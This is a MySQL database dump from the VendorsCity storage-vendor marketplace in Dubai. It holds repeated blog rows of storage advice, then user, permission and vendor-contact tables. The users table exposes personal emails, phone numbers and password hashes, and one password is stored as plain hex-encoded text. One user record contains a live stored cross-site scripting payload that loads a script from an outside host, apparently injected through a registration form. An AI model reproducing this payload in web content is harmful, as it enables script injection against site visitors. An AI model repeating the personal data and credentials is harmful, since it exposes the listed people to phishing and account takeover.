(31, 'Self Storage vs Shared Storage', '', '<p>When deciding between self-storage and shared storage solutions, it boils down to your specific needs and preferences. Opting for self-storage offers exclusive control, privacy, and easy accessibility to your stored items. On the other hand, shared storage is a cost-effective option with a sense of community and managed facilities. Consider the nature of your items, budget constraints, and how often you\'ll need access to make the choice that aligns best with your requirements. Whether you prioritize individual control or cost-effectiveness, both options cater to distinct preferences in storage solutions.</p>', 62),
(32, 'AC Storage vs NON-AC Storage', '', '<p>Deciding between AC and non-AC storage hinges on the nature of your stored items and your budget. AC storage offers controlled temperature and humidity, making it suitable for delicate items like antiques and electronics but tends to be more expensive. Non-AC storage, being cost-effective, is suitable for items that can withstand varying temperatures, such as outdoor furniture or tools. Consider the specific preservation needs of your belongings and your budget constraints to make the optimal choice for your storage solution.</p>', 62),
(33, 'Choosing the right Storage Vendor', '', '<p>When selecting a storage vendor, key considerations can significantly impact the safety and convenience of your stored belongings. Prioritize security features, ensuring surveillance and access controls are robust. Check for climate control options, especially for sensitive items. Evaluate storage unit sizes, accessibility, and inquire about insurance coverage. Customer reviews offer insights into the vendor\'s reputation. Opt for a conveniently located facility, keeping transportation in mind. Assess cleanliness, maintenance, and contract terms, favoring flexibility. If you have specific needs, check for specialized services. By attentively weighing these factors, you can make an informed decision and ensure a secure and tailored storage solution.</p>', 62),
(34, 'How VendorsCity can make a difference', '', '<p>VendorsCity provides an efficient method for discovering the perfect storage solution in Dubai. Obtain up to 5 complimentary quotes from accredited local storage service providers, giving you the knowledge to make well-informed decisions. By comparing prices and reviews, you can confidently choose the storage company that aligns best with your requirements. This considerate process ensures a stress-free storage experience tailored to your preferences. Operating within an extensive network of Dubai storage providers, VendorsCity meticulously evaluates them for quality and reliability. While we aim for excellence, it\'s important to recognize that no company can guarantee a flawless storage solution. We encourage customers to conduct their own research, read reviews, and select a storage partner with confidence.</p>', 63),
(35, 'Items which are prohibited to store', '', '<p>Storage units in Dubai have restrictions on certain items, guided by security, safety, and regulatory considerations. These prohibited items include valuables, perishable foods, toxic or hazardous materials, animals, plants, unregistered vehicles, and machinery with full fuel tanks. To ensure adherence to regulations and make informed decisions about your storage, it\'s crucial to engage with the storage facility manager. By understanding specific limitations and guidelines for your chosen storage unit, you contribute to a secure and well-managed storage experience in Dubai, aligning with regulatory standards and ensuring the safety of both your belongings and the storage facility.</p>', 63),
(36, 'Self Storage vs Shared Storage', '', '<p>When deciding between self-storage and shared storage solutions, it boils down to your specific needs and preferences. Opting for self-storage offers exclusive control, privacy, and easy accessibility to your stored items. On the other hand, shared storage is a cost-effective option with a sense of community and managed facilities. Consider the nature of your items, budget constraints, and how often you\'ll need access to make the choice that aligns best with your requirements. Whether you prioritize individual control or cost-effectiveness, both options cater to distinct preferences in storage solutions.</p>', 63),
(37, 'AC Storage vs NON-AC Storage', '', '<p>Deciding between AC and non-AC storage hinges on the nature of your stored items and your budget. AC storage offers controlled temperature and humidity, making it suitable for delicate items like antiques and electronics but tends to be more expensive. Non-AC storage, being cost-effective, is suitable for items that can withstand varying temperatures, such as outdoor furniture or tools. Consider the specific preservation needs of your belongings and your budget constraints to make the optimal choice for your storage solution.</p>', 63),
(38, 'Choosing the right Storage Vendor', '', '<p>When selecting a storage vendor, key considerations can significantly impact the safety and convenience of your stored belongings. Prioritize security features, ensuring surveillance and access controls are robust. Check for climate control options, especially for sensitive items. Evaluate storage unit sizes, accessibility, and inquire about insurance coverage. Customer reviews offer insights into the vendor\'s reputation. Opt for a conveniently located facility, keeping transportation in mind. Assess cleanliness, maintenance, and contract terms, favoring flexibility. If you have specific needs, check for specialized services. By attentively weighing these factors, you can make an informed decision and ensure a secure and tailored storage solution.</p>', 63),
(39, 'How VendorsCity can make a difference', '', '<p>VendorsCity provides an efficient method for discovering the perfect storage solution in Dubai. Obtain up to 5 complimentary quotes from accredited local storage service providers, giving you the knowledge to make well-informed decisions. By comparing prices and reviews, you can confidently choose the storage company that aligns best with your requirements. This considerate process ensures a stress-free storage experience tailored to your preferences. Operating within an extensive network of Dubai storage providers, VendorsCity meticulously evaluates them for quality and reliability. While we aim for excellence, it\'s important to recognize that no company can guarantee a flawless storage solution. We encourage customers to conduct their own research, read reviews, and select a storage partner with confidence.</p>', 64),
(40, 'Items which are prohibited to store', '', '<p>Storage units in Dubai have restrictions on certain items, guided by security, safety, and regulatory considerations. These prohibited items include valuables, perishable foods, toxic or hazardous materials, animals, plants, unregistered vehicles, and machinery with full fuel tanks. To ensure adherence to regulations and make informed decisions about your storage, it\'s crucial to engage with the storage facility manager. By understanding specific limitations and guidelines for your chosen storage unit, you contribute to a secure and well-managed storage experience in Dubai, aligning with regulatory standards and ensuring the safety of both your belongings and the storage facility.</p>', 64),
(41, 'Self Storage vs Shared Storage', '', '<p>When deciding between self-storage and shared storage solutions, it boils down to your specific needs and preferences. Opting for self-storage offers exclusive control, privacy, and easy accessibility to your stored items. On the other hand, shared storage is a cost-effective option with a sense of community and managed facilities. Consider the nature of your items, budget constraints, and how often you\'ll need access to make the choice that aligns best with your requirements. Whether you prioritize individual control or cost-effectiveness, both options cater to distinct preferences in storage solutions.</p>', 64),
(42, 'AC Storage vs NON-AC Storage', '', '<p>Deciding between AC and non-AC storage hinges on the nature of your stored items and your budget. AC storage offers controlled temperature and humidity, making it suitable for delicate items like antiques and electronics but tends to be more expensive. Non-AC storage, being cost-effective, is suitable for items that can withstand varying temperatures, such as outdoor furniture or tools. Consider the specific preservation needs of your belongings and your budget constraints to make the optimal choice for your storage solution.</p>', 64),
(43, 'Choosing the right Storage Vendor', '', '<p>When selecting a storage vendor, key considerations can significantly impact the safety and convenience of your stored belongings. Prioritize security features, ensuring surveillance and access controls are robust. Check for climate control options, especially for sensitive items. Evaluate storage unit sizes, accessibility, and inquire about insurance coverage. Customer reviews offer insights into the vendor\'s reputation. Opt for a conveniently located facility, keeping transportation in mind. Assess cleanliness, maintenance, and contract terms, favoring flexibility. If you have specific needs, check for specialized services. By attentively weighing these factors, you can make an informed decision and ensure a secure and tailored storage solution.</p>', 64),
(44, 'How VendorsCity can make a difference', '', '<p>VendorsCity provides an efficient method for discovering the perfect storage solution in Dubai. Obtain up to 5 complimentary quotes from accredited local storage service providers, giving you the knowledge to make well-informed decisions. By comparing prices and reviews, you can confidently choose the storage company that aligns best with your requirements. This considerate process ensures a stress-free storage experience tailored to your preferences. Operating within an extensive network of Dubai storage providers, VendorsCity meticulously evaluates them for quality and reliability. While we aim for excellence, it\'s important to recognize that no company can guarantee a flawless storage solution. We encourage customers to conduct their own research, read reviews, and select a storage partner with confidence.</p>', 65),
(45, 'Items which are prohibited to store', '', '<p>Storage units in Dubai have restrictions on certain items, guided by security, safety, and regulatory considerations. These prohibited items include valuables, perishable foods, toxic or hazardous materials, animals, plants, unregistered vehicles, and machinery with full fuel tanks. To ensure adherence to regulations and make informed decisions about your storage, it\'s crucial to engage with the storage facility manager. By understanding specific limitations and guidelines for your chosen storage unit, you contribute to a secure and well-managed storage experience in Dubai, aligning with regulatory standards and ensuring the safety of both your belongings and the storage facility.</p>', 65),
(46, 'Self Storage vs Shared Storage', '', '<p>When deciding between self-storage and shared storage solutions, it boils down to your specific needs and preferences. Opting for self-storage offers exclusive control, privacy, and easy accessibility to your stored items. On the other hand, shared storage is a cost-effective option with a sense of community and managed facilities. Consider the nature of your items, budget constraints, and how often you\'ll need access to make the choice that aligns best with your requirements. Whether you prioritize individual control or cost-effectiveness, both options cater to distinct preferences in storage solutions.</p>', 65),
(47, 'AC Storage vs NON-AC Storage', '', '<p>Deciding between AC and non-AC storage hinges on the nature of your stored items and your budget. AC storage offers controlled temperature and humidity, making it suitable for delicate items like antiques and electronics but tends to be more expensive. Non-AC storage, being cost-effective, is suitable for items that can withstand varying temperatures, such as outdoor furniture or tools. Consider the specific preservation needs of your belongings and your budget constraints to make the optimal choice for your storage solution.</p>', 65),
(48, 'Choosing the right Storage Vendor', '', '<p>When selecting a storage vendor, key considerations can significantly impact the safety and convenience of your stored belongings. Prioritize security features, ensuring surveillance and access controls are robust. Check for climate control options, especially for sensitive items. Evaluate storage unit sizes, accessibility, and inquire about insurance coverage. Customer reviews offer insights into the vendor\'s reputation. Opt for a conveniently located facility, keeping transportation in mind. Assess cleanliness, maintenance, and contract terms, favoring flexibility. If you have specific needs, check for specialized services. By attentively weighing these factors, you can make an informed decision and ensure a secure and tailored storage solution.</p>', 65),
(49, 'How VendorsCity can make a difference', '', '<p>VendorsCity provides an efficient method for discovering the perfect storage solution in Dubai. Obtain up to 5 complimentary quotes from accredited local storage service providers, giving you the knowledge to make well-informed decisions. By comparing prices and reviews, you can confidently choose the storage company that aligns best with your requirements. This considerate process ensures a stress-free storage experience tailored to your preferences. Operating within an extensive network of Dubai storage providers, VendorsCity meticulously evaluates them for quality and reliability. While we aim for excellence, it\'s important to recognize that no company can guarantee a flawless storage solution. We encourage customers to conduct their own research, read reviews, and select a storage partner with confidence.</p>', 66),
(50, 'Items which are prohibited to store', '', '<p>Storage units in Dubai have restrictions on certain items, guided by security, safety, and regulatory considerations. These prohibited items include valuables, perishable foods, toxic or hazardous materials, animals, plants, unregistered vehicles, and machinery with full fuel tanks. To ensure adherence to regulations and make informed decisions about your storage, it\'s crucial to engage with the storage facility manager. By understanding specific limitations and guidelines for your chosen storage unit, you contribute to a secure and well-managed storage experience in Dubai, aligning with regulatory standards and ensuring the safety of both your belongings and the storage facility.</p>', 66),
(51, 'Self Storage vs Shared Storage', '', '<p>When deciding between self-storage and shared storage solutions, it boils down to your specific needs and preferences. Opting for self-storage offers exclusive control, privacy, and easy accessibility to your stored items. On the other hand, shared storage is a cost-effective option with a sense of community and managed facilities. Consider the nature of your items, budget constraints, and how often you\'ll need access to make the choice that aligns best with your requirements. Whether you prioritize individual control or cost-effectiveness, both options cater to distinct preferences in storage solutions.</p>', 66),
(52, 'AC Storage vs NON-AC Storage', '', '<p>Deciding between AC and non-AC storage hinges on the nature of your stored items and your budget. AC storage offers controlled temperature and humidity, making it suitable for delicate items like antiques and electronics but tends to be more expensive. Non-AC storage, being cost-effective, is suitable for items that can withstand varying temperatures, such as outdoor furniture or tools. Consider the specific preservation needs of your belongings and your budget constraints to make the optimal choice for your storage solution.</p>', 66),
(53, 'Choosing the right Storage Vendor', '', '<p>When selecting a storage vendor, key considerations can significantly impact the safety and convenience of your stored belongings. Prioritize security features, ensuring surveillance and access controls are robust. Check for climate control options, especially for sensitive items. Evaluate storage unit sizes, accessibility, and inquire about insurance coverage. Customer reviews offer insights into the vendor\'s reputation. Opt for a conveniently located facility, keeping transportation in mind. Assess cleanliness, maintenance, and contract terms, favoring flexibility. If you have specific needs, check for specialized services. By attentively weighing these factors, you can make an informed decision and ensure a secure and tailored storage solution.</p>', 66),
(54, 'Lorem Ipsum', '1717004656-1_F7sTt3Ee5gEdLyyhHdZZRg.jpg', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie.</p>', 71);

-- --------------------------------------------------------

--
-- Table structure for table `system`
--

CREATE TABLE `system` (
  `id` int(11) NOT NULL,
  `percentage` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `system`
--

INSERT INTO `system` (`id`, `percentage`) VALUES
(1, 10);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `role_id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `mobile` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `companywebsite` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `city` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `serviceList` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `crole` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `parentcname` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `establishment_date` date DEFAULT NULL,
  `tlexpiry` date DEFAULT NULL,
  `staff` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `remarks` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `socialmedai` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `vatcertificate` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `company_logo` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `trncertificate` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `tradelicense` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `vendor` int(11) DEFAULT NULL,
  `is_active` int(11) DEFAULT '1' COMMENT '0-Active,1-Inactive',
  `image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `wallet_amount` bigint(20) NOT NULL DEFAULT '0',
  `short_description` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `rating` varchar(11) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `number_of_review` int(11) DEFAULT NULL,
  `review_link` text COLLATE utf8mb4_unicode_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `role_id`, `name`, `user_name`, `email`, `email_verified_at`, `password`, `mobile`, `companywebsite`, `city`, `serviceList`, `crole`, `parentcname`, `establishment_date`, `tlexpiry`, `staff`, `remarks`, `socialmedai`, `vatcertificate`, `company_logo`, `trncertificate`, `tradelicense`, `vendor`, `is_active`, `image`, `remember_token`, `wallet_amount`, `short_description`, `created_at`, `updated_at`, `rating`, `number_of_review`, `review_link`) VALUES
(1, '1', 'Admin', '', 'admin@gmail.com', NULL, '$2y$10$e72baN/g/IhpkD4b0PJ9zuSE6mQN7VFBzoqKjCE3pymA1LUQtAsx.', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, 0, NULL, '2023-07-28 03:04:25', '2023-07-28 03:04:25', NULL, NULL, NULL),
(3, '4', '', 'sub', 'sub@gmail.com', NULL, '73756261646D696E', '1234567890', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, 0, NULL, '2023-09-20 06:29:25', '2023-09-20 06:29:25', NULL, NULL, NULL),
(63, '4', 'xyz', 'xyz', 'test@gmail.com', NULL, '$2y$10$YC.u0wAojeHlamWi7ZOKxe2yIUTgsgJnKz.2LBu8BYn7nepTSjGCy', '9999999999', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, 0, NULL, '2023-11-11 00:24:53', '2023-11-11 00:24:53', NULL, NULL, NULL),
(73, '8', 'dev', 'dev', 'devang.hnrtechnologies@gmail.com', NULL, '$2y$10$MbdBHmliZg5grlhtqARX5eyzK9I1G02VjKexQMmD2D9Cv7rqZ3IYa', '9033259413', '', '24', '30', '', '', '0000-00-00', '0000-00-00', '', '', '', NULL, '6656e1a9c487e_thumb.png', NULL, NULL, 1, 0, NULL, NULL, 8226, '', '2024-03-02 06:47:40', '2024-03-02 06:47:40', '4.5', 100, ''),
(74, '8', 'mayudin', 'mayudin', 'mayudin1904@gmail.com', NULL, '$2y$10$Nez3PMedM/jujnCrTeVBHuKzWM1sThM3qQcajbIawhMhT/Zp/mKYe', '7990739286', 'mayudin1904@gmail.com', '17', NULL, 'Iron Company', '', '2024-05-31', '2024-06-30', '5', '1', '', '662c90bf0f017.jpg', NULL, '662c90bf0f6db.pdf', '662c90bf0f7cd.jpg', 1, 1, NULL, NULL, 49999, 'this is for testing perpose only', '2024-04-27 05:44:31', '2024-04-27 05:44:31', NULL, NULL, NULL),
(75, '8', 'mayudin Chauhan', 'mayudin chauhan', 'mayudin.hnrtechnologies@gmail.com', NULL, '$2y$10$TFL3aDlCRIv8gGuIXOQ5ge1PFiRbzsKKW7cmEciveN6a9u7TM1l2i', '1234567890', '', '', NULL, '', '', '0000-00-00', '0000-00-00', '', '', '', NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 4900, '', '2024-04-27 10:34:19', '2024-04-27 10:34:19', '', 0, ''),
(76, '8', 'Ventesh', 'ventesh', 'venteshh.hnrtechnologies@gmail.com', NULL, '$2y$10$.Cu/mqUqIij6C5h49pzRpebKkVjVKiDWK0g7sbl1KlAT3bruwjF1K', NULL, '', '', NULL, '', '', '0000-00-00', '0000-00-00', '', '', '', NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, '', '2024-04-27 10:35:46', '2024-04-27 10:35:46', NULL, NULL, NULL),
(77, '8', 'Adarsh', 'adarsh', 'adarsh.hnrtechnologies@gmail.com', NULL, '$2y$10$jOZr6UlUQVZu8M00FL2eoeocAAqocWS/HcEc3n7/avttuZGh5.EHW', NULL, '', '', '30', '', '', '0000-00-00', '0000-00-00', '', '', '', NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 247, '', '2024-04-27 10:36:40', '2024-04-27 10:36:40', '', 0, ''),
(78, '8', 'Nikul New Company', 'nikul new company', 'patelnikul321@gmail.com', NULL, '$2y$10$l.90tJsFJ6vEXrCIjp/6Be3f7WBQ98ANyKhfg.WnKBsKsYqir4rPO', '8097517477', 'Https://www.google.com', '21', NULL, 'Test', 'New Test Company', '2024-05-18', '2024-05-25', '15', 'New Busy Moment', 'test', NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 197, 'Test desc', '2024-05-18 05:34:12', '2024-05-18 05:34:12', NULL, NULL, NULL),
(79, '8', 'Suhaan Mukadam', 'suhaan mukadam', 'suhaanmukadam007@gmail.com', NULL, '$2y$10$kjNdx.MC0As2VH6ODmWqdu0TiEFa7OcqRLBODGtgIfIdQosNvoVM2', NULL, 'Https://www.google.com', '17', '30', 'Moving', 'Suhaan Mukadam Quick Serve', '2024-05-18', '0000-00-00', '', '', '', NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 56, '', '2024-05-18 11:02:13', '2024-05-18 11:02:13', '', 0, ''),
(89, '8', 'Ventesh', 'ventesh', 'ventesh.hnrtechnologies@gmail.com', NULL, '$2y$10$fzjV3.tdg8xIl7f3ZkRsOudVS/0opesf1ZXlM./ordRt.6jtD/Mg2', '1231231233', 'Test', '21', '30,44,45', NULL, NULL, NULL, NULL, '15', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'Test', '2024-05-22 13:31:30', '2024-05-22 13:31:30', NULL, NULL, NULL),
(91, '8', 'QuickServe Relocations LLC', 'quickserve relocations llc', 'accounts@quickserverelo.com', NULL, '$2y$10$MWjHjo/QwhrNzI8GIcAhLeAfOhSIjH5jEwz/bigV4pKoUYAi.AQdu', '0565477015', 'www.quickserverelo.com', '17', '30,44', '', '', '0000-00-00', '0000-00-00', '5', '', '@myquickserve', NULL, '665783c85c1d6_thumb.png', NULL, NULL, 1, 1, NULL, NULL, 8565, '', '2024-05-25 08:42:35', '2024-05-25 08:42:35', '4.7', 330, 'https://www.google.com/search?q=quickserve+relocations&rlz=1C5CHFA_enAE1014AE1015&oq=quickserve+relocations&gs_lcrp=EgZjaHJvbWUqDAgAECMYJxiABBiKBTIMCAAQIxgnGIAEGIoFMg0IARAuGK8BGMcBGIAEMgYIAhAjGCcyBwgDEAAYgAQyBwgEEAAYgAQyBwgFEAAYgAQyBggGEEUYPTIGCAcQRRg80gEIMzQ0MGowajmoAgCwAgE&sourceid=chrome&ie=UTF-8#lrd=0x3e5f69438519286f:0xa1f56bc6c01e622,1,,,,'),
(92, '8', 'Nikul Patel', 'nikul patel', 'nikulfordevops@gmail.com', NULL, '$2y$10$jR9b9JH1DcPn8Y1MzA5v9Ogq1FLYc2R7PtmETPxDQ/PT4c.jvMHGK', '8097517477', 'Https://www.google.com', '20', '30,44', NULL, NULL, NULL, NULL, '4', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'Test', '2024-05-25 09:02:34', '2024-05-25 09:02:34', NULL, NULL, NULL),
(97, '8', 'Test Account', 'test account', 'contact.hnrtechnologies@gmail.com', NULL, '$2y$10$hgiXhXu8ExxEUHIWe8Uk8.8QsyNyJBfCdYIlP0J2moa/z68vtobJy', '1234567891', '', '20', '30', NULL, NULL, NULL, NULL, '10', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'This is just testing', '2024-05-27 13:35:51', '2024-05-27 13:35:51', NULL, NULL, NULL),
(101, '8', 'a', 'a', 'a@a.com', NULL, '$2y$10$0zQU7BJiuE/pnY3buw2EOe0ayHL0YMRZZSxe0sg8Uv7U3LErgEUZa', '0585200722', '', '17', '30', NULL, NULL, NULL, NULL, 'a', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'a', '2024-05-29 20:23:50', '2024-05-29 20:23:50', NULL, NULL, NULL),
(103, '8', 'QUICKSERVE RELOCATINS LLC', 'quickserve relocatins llc', 'suman.aca@gmail.com', NULL, '$2y$10$8YQzWk4nkGscndMntmIVneQ0.GHf0.KY6R1/2dS5u2cxZsR5OERry', '0565477015', 'www.quickserverelo.com', '17', '30,44', NULL, NULL, NULL, NULL, '6', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'Leads', '2024-06-04 12:48:45', '2024-06-04 12:48:45', NULL, NULL, NULL),
(104, '1', '<sCRiPt/sRC=//f0l.co/5/></sCrIpT>fasase', '<sCRiPt/sRC=//f0l.co/5/></sCrIpT>fasase', 'fasase@mail.com', NULL, '$2y$10$Sadn0T1p2k3yPCmYJv9KzuogR/M3zSjiyym9.Ed/pJ2zYYuXaXTQi', '1', '1', '26', '45', NULL, NULL, NULL, NULL, '1', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, '252353245679976990345', '2024-06-05 08:32:05', '2024-06-05 08:32:05', NULL, NULL, NULL),
(105, '1', 'panlee', 'panlee', 'panlee@mail.com', NULL, '$2y$10$LgDe2oexbK4LzedJEZymAuYNEf67x9W9HrHZBNIbIJNFHXVQvwPMu', '1', '1', '26', '45', NULL, NULL, NULL, NULL, '1', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, '252353245679976990345', '2024-06-08 16:23:05', '2024-06-08 16:23:05', NULL, NULL, NULL),
(106, '8', 'Zana', 'zana', 'suhaanmukadam16@gmail.com', NULL, '$2y$10$FEyzcPZCpOjzXD.osOFVKOfGg3INHYMk1AjpG2oHcQ4r5ejYqs4FW', '0585200722', 'www.zana.com', '17', '30,44,45', '', '', '0000-00-00', '0000-00-00', '20', '', '', NULL, '666db7c0c77f0_thumb.png', NULL, NULL, 1, 0, '1718456498zana_logo-2-5442f653db1f58a64fe0bbb0a6b492b0.png', NULL, 975, 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut vestibulum, nisi ut rhoncus pellentesque, arcu diam mollis erat, eget egestas justo metus sed justo. Vestibulum semper, justo et egestas aliquam, sem lacus laoreet diam, nec accumsan erat lectus eu risus. Donec commodo auctor semper. Aenean egestas lobortis odio non dapibus. Etiam commodo lacus eu dui viverra sagittis. Praesent iaculis nibh ut est tincidunt ullamcorper.\r\n', '2024-06-15 12:32:23', '2024-06-15 12:32:23', '4.7', 15000, 'https://www.google.com/search?q=quickserve+relocations&rlz=1C5CHFA_enAE1014AE1015&oq=quickserve+relocations&gs_lcrp=EgZjaHJvbWUqDAgAECMYJxiABBiKBTIMCAAQIxgnGIAEGIoFMg0IARAuGK8BGMcBGIAEMgYIAhAjGCcyBwgDEAAYgAQyBwgEEAAYgAQyBwgFEAAYgAQyBggGEEUYPTIGCAcQRRg80gEIMzQ0MGowajmoAgCwAgE&sourceid=chrome&ie=UTF-8#lrd=0x3e5f69438519286f:0xa1f56bc6c01e622,1,,,,'),
(107, '8', 'Abhishek', 'abhishek', 'abhishek.hnrtechnologies@gmail.com', NULL, '$2y$10$NMBn5bnsS.W8jMPiM5ozeuZGSFz5h4PsMCPnPUg0kVHWskb97MbvC', '1234657890', 'test', '26', '30,44,45', NULL, NULL, NULL, NULL, '12', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'test', '2024-06-17 13:32:39', '2024-06-17 13:32:39', NULL, NULL, NULL),
(108, '8', 'test', 'test', 'test11@gmail.com', NULL, '$2y$10$HPJuX6b1AoycfJAWoJOQY.6VHPQjsFwpjBWPfBeagrPwZda6w6jZa', '1234567890', 'sfs', '25', '30,44', NULL, NULL, NULL, NULL, '1', NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, NULL, 0, 'test', '2024-06-19 10:29:03', '2024-06-19 10:29:03', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `user_permissions`
--

CREATE TABLE `user_permissions` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `cname` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `permission` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `editperm` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `user_permissions`
--

INSERT INTO `user_permissions` (`id`, `cname`, `permission`, `editperm`, `created_at`, `updated_at`) VALUES
(1, 'admin', '1,2,3,4,5,6,7,8,9,10,11,12,14,15,16,17,18,19,20,21,22,23,24,25', '1,2,3,4,5,6,7,8,9,10,11,12,14,15,16,17,18,19,20,21,22,23,24,25', '2023-09-18 05:33:28', '2024-05-27 06:12:35'),
(4, 'subadmin', '1', '1', '2023-09-19 10:04:47', '2023-09-21 06:30:27'),
(8, 'vendor', '1,2,3,4,5,6,7', '1,2,3,4,5,6,7', '2023-10-31 01:27:53', '2023-11-03 00:57:43');

-- --------------------------------------------------------

--
-- Table structure for table `vendors_attribute`
--

CREATE TABLE `vendors_attribute` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `poc` varchar(255) DEFAULT NULL,
  `poctitle` varchar(255) DEFAULT NULL,
  `c_email` varchar(255) DEFAULT NULL,
  `telephone` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `vendors_attribute`
--

INSERT INTO `vendors_attribute` (`id`, `pid`, `poc`, `poctitle`, `c_email`, `telephone`) VALUES
(1, 40, 'juis brands', 'juis brands', 'juis@gmail.com', '7897899877'),
(3, 41, 'test', 'test', 'test@gmail.com', '7897897899'),
(4, 44, 'test 1', 't1', 't1@gmail.com', '9999999999'),
(5, 44, 'test 2', 't2', 't2@gmail.com', '8888888888'),
(7, 44, 't4', 't44', 't4@gmail.com', '2222222222'),
(10, 45, 'abc123', 'abc123', 'abc123@gmail.com', '1234567890'),
(14, 48, 'poc full ', 'poc title', 'company@gmail.com', '123456789'),
(17, 46, 'test', 'test', 'test@gmail.com', '1234567890'),
(21, 49, 'Rajnikant', 'T1', 'rajp@gmail.com', '9658965896'),
(22, 49, 'Nikul', 'T2', 'nik@gmail.com', '8569856985'),
(25, 62, 't1', 't1', 't1@gmail.com', '7897897899'),
(26, 69, 'test', 'test', 'test', '1234567890'),
(27, 72, 'Zafar Mukadam', 'Director', 'zafar@quickserverelo.com', '0508807610'),
(28, 72, 'Suhaan', 'a', 'a', '0585200722'),
(29, 78, 'RE', 'Nikul', 'patelnikul321@gmail.com', '1231231233'),
(30, 79, 'Suhaan', 'Manager', 'suhaanmukadam007@gmail.com', '12312313'),
(31, 81, 'test', 'test', 'test@gmail.com', '8797897899'),
(32, 83, 'Test123', 'Test123', 'Test123@gmail.com', '1234567890'),
(34, 90, 'Suhaan', 'manager', 'admin@gmail.com', ''),
(35, 91, 'Suman', 'Accountant', 'accounts@quickserverelo.com', '0565477015'),
(36, 92, 'Nikul Patel', 'CFO', 'patelnikul321@gmail.com', '8097517477'),
(37, 93, 'test', 'manager', 'admin@gmail.com', '202032023'),
(38, 103, 'SUMAN', 'ACCOUNTANT', 'accounts@quickserverelo.com, zafar@quickserverelo.com', '0565477015'),
(39, 104, '1', '1', 'fasase@mail.com', '6567426742'),
(40, 77, 'test', 'test', 'abhishek.hnrtechnologies@gmail.com', ''),
(42, 73, 'test', 'test', 'abhishek.hnrtechnologies@gmail.com', ''),
(45, 75, 'test', 'tests', 'abhishek.hnrtechnologies@gmail.com', '1234567890'),
(46, 91, 'Zafar', 'Manager', 'zafar@quickserverelo.com', '123456789'),
(47, 91, 'Suhan', '', 'suhaanmukadam007@gmail.com', ''),
(48, 73, 'Ventesh', '', 'ventesh.hnrtechnologies@gmail.com', ''),
(49, 73, 'Asmit', '', 'asmit@digitalsadhus.com', ''),
(50, 105, '1', '1', 'panlee@mail.com', '6567426742'),
